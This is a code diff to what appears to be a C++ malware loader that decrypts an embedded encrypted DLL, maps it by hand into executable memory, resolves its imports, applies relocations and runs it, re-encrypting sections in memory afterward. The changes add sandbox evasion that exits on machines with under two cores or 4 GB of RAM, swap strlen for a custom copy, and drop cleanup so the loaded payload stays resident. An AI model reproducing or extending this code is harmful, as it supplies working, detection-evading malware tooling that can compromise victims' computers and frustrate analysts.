@@ -10,7 +10,7 @@
 HMODULE hModule2;
 LPVOID lpReserved2;
 
-#define NEW_ADDRESS 0x10000
+#define NEW_ADDRESS 0x00
 
 // Define a macro for the debug printf
 #ifdef _DEBUG
@@ -30,9 +30,17 @@ Works with :
 - Doesn't copy headers
 */
 
+size_t my_strlen(const char* str) {
+    //START
+    size_t s = 0;
+    for (; str[s] != '\0'; ++s);
+    return s;
+    //END
+}
+
 void decrypt(const char* key, int offset = 0, int limit = -1) {
 	//START
-    size_t key_size = strlen(key);
+    size_t key_size = my_strlen(key);
     const int bufferSize = sizeof(sample) / sizeof(sample[0]);
     if (limit == -1) limit = bufferSize;
 	if (key_size == 0) return;
@@ -73,7 +81,8 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     }
 
     const size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
-    void* image_base = VirtualAlloc((LPVOID)newBase, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void* image_base = (LPVOID)newBase;
+    image_base = VirtualAlloc(image_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (image_base == NULL) {
         return NULL;
     }
@@ -86,7 +95,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
         memcpy(static_cast<char*>(image_base) + section_header->VirtualAddress, static_cast<const char*>(dll_buffer) + section_header->PointerToRawData, section_header->SizeOfRawData);
 		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //encrypt back section
 	}
-    
+
     DEBUG_PRINTF("[+] Wrote section data\n");
 
     DEBUG_PRINTF("[+] Rebasing Dll\n");
@@ -105,7 +114,6 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 
         HMODULE import_dll = LoadLibraryA(import_dll_name);
         if (import_dll == NULL) {
-            VirtualFree(image_base, 0, MEM_RELEASE);
             return NULL;
         }
 
@@ -140,7 +148,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     DEBUG_PRINTF("[+] Doing relocation\n");
 
     const IMAGE_BASE_RELOCATION* base_relocation = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-    DWORD delta = newBase - nt_headers->OptionalHeader.ImageBase;
+    DWORD delta = (DWORD)image_base - nt_headers->OptionalHeader.ImageBase;
 
     while (base_relocation->VirtualAddress != 0) {
         const WORD* relocation_block = reinterpret_cast<const WORD*>(base_relocation + 1);
@@ -206,12 +214,26 @@ int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCm
 #endif
 {
 	//START
-
 #ifdef _DEBUG
     allo();
 #endif
 
     DEBUG_PRINTF("[+] Started\n");
+
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    ULONGLONG totalPhysicalMemory = memoryStatus.ullTotalPhys;
+
+    // Convert total physical memory to gigabytes
+    double totalPhysicalMemoryGB = static_cast<double>(totalPhysicalMemory) / (1024 * 1024 * 1024);
+
+    // Get the number of processor cores
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+    DWORD numProcessorCores = systemInfo.dwNumberOfProcessors;
+    if (numProcessorCores < 2 || (int)totalPhysicalMemoryGB < 4)
+        return 0;
 
     const int bufferSize = sizeof(sample) / sizeof(sample[0]);
 	
@@ -220,8 +242,6 @@ int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCm
         DEBUG_PRINTF("[-] Failed to load DLL\n");
         return 1;
     }
-
-    ::FreeLibrary(dll);
 
     return 0;
 	//END
